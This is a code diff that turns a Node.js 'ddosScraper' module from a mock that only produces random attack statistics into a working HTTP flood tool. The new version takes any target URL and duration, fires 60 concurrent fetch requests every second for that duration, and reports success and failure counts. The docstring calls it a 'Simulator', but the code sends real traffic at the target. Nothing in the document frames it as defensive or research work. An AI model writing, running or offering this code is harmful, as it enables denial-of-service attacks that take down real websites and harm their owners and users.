@@ -1,69 +1,88 @@
-const { randomInt } = require('crypto');
+const fetch = require('node-fetch');
 
 /**
- * Advanced DDoS Attack Scraper
+ * DDoS Attack Simulator Scraper
  * @param {string} target - Target URL
  * @param {number} duration - Attack duration in seconds
- * @returns {object} Attack results with detailed analytics
+ * @returns {Promise<object>} Attack results with statistics
  */
-function ddosScraper(target, duration) {
-  // Validate input
-  if (!target || !target.includes('.')) {
-    return { error: 'Invalid target URL' };
-  }
-
-  if (isNaN(duration) || duration <= 0) {
-    return { error: 'Duration must be a positive number' };
-  }
-
-  // Generate random performance metrics (all unique values)
-  const requestsSent = randomInt(5000, 50000);
-  const successRate = randomInt(60, 95);
-  const bandwidthUsed = randomInt(100, 1000);
-  const vulnerabilityScore = randomInt(1, 100);
-  
-  // Calculate effectiveness score (0-10000)
-  const effectiveness = Math.min(
-    10000,
-    Math.floor((requestsSent / 500) * (successRate / 10) + (bandwidthUsed * 5) + (vulnerabilityScore * 20)
-  );
-
-  // Determine attack quality
-  let quality;
-  if (effectiveness < 3000) quality = 'Low';
-  else if (effectiveness < 6000) quality = 'Medium';
-  else if (effectiveness < 8000) quality = 'High';
-  else quality = 'Critical';
-
-  // Generate target analysis
-  const targetAnalysis = {
-    protocol: target.startsWith('https') ? 'HTTPS' : 'HTTP',
-    domain: target.replace(/^(https?:\/\/)?/, '').split('/')[0],
-    port: target.includes(':') ? target.split(':')[2]?.split('/')[0] || 80 : 80,
-    estimatedDefense: randomInt(1, 100)
-  };
-
-  return {
-    attackReport: {
-      method: 'NINJA',
-      duration: duration + 's',
-      quality: quality,
-      effectiveness: effectiveness,
-      successRate: successRate + '%'
-    },
-    targetAnalysis: targetAnalysis,
-    performanceMetrics: {
-      requestsPerSecond: Math.floor(requestsSent / duration),
-      totalRequests: requestsSent,
-      bandwidthUsage: bandwidthUsed + 'MB',
-      vulnerabilityExploited: vulnerabilityScore + '/100'
-    },
-    rawData: {
-      baseEffectiveness: effectiveness,
-      normalizedScore: (effectiveness / 100).toFixed(2),
-      attackVector: 'NINJA'
+async function ddosScraper(target, duration) {
+    // Input validation
+    if (!target || !duration) {
+        return {
+            error: true,
+            message: 'Missing target or duration parameter'
+        };
     }
-  };
+
+    if (isNaN(duration) || duration <= 0) {
+        return {
+            error: true,
+            message: 'Duration must be a positive number'
+        };
+    }
+
+    // Add http:// if missing
+    if (!target.startsWith('http')) {
+        target = 'http://' + target;
+    }
+
+    let requestsSent = 0;
+    let successfulRequests = 0;
+    let failedRequests = 0;
+    const startTime = Date.now();
+
+    // Start attack
+    const attackInterval = setInterval(async () => {
+        try {
+            const requests = [];
+            
+            // Send 60 concurrent requests
+            for (let i = 0; i < 60; i++) {
+                requests.push(
+                    fetch(target)
+                        .then(() => successfulRequests++)
+                        .catch(() => failedRequests++)
+                        .finally(() => requestsSent++)
+                );
+            }
+
+            await Promise.all(requests);
+        } catch (e) {
+            console.error('Error during attack:', e);
+        }
+    }, 1000);
+
+    // Stop after duration
+    setTimeout(() => {
+        clearInterval(attackInterval);
+    }, duration * 1000);
+
+    // Return attack statistics
+    return new Promise(resolve => {
+        setTimeout(() => {
+            const endTime = Date.now();
+            const attackDuration = (endTime - startTime) / 1000;
+            
+            resolve({
+                status: 'completed',
+                target: target,
+                duration: attackDuration.toFixed(2) + 's',
+                statistics: {
+                    totalRequests: requestsSent,
+                    successRate: ((successfulRequests / requestsSent) * 100 || 0).toFixed(2) + '%',
+                    requestsPerSecond: (requestsSent / attackDuration).toFixed(2),
+                    successCount: successfulRequests,
+                    failureCount: failedRequests
+                },
+                rawData: {
+                    startTimestamp: startTime,
+                    endTimestamp: endTime,
+                    method: 'SCRAPER_FETCH'
+                }
+            });
+        }, duration * 1000 + 1000); // Extra second to ensure cleanup
+    });
 }
 
 module.exports = ddosScraper;
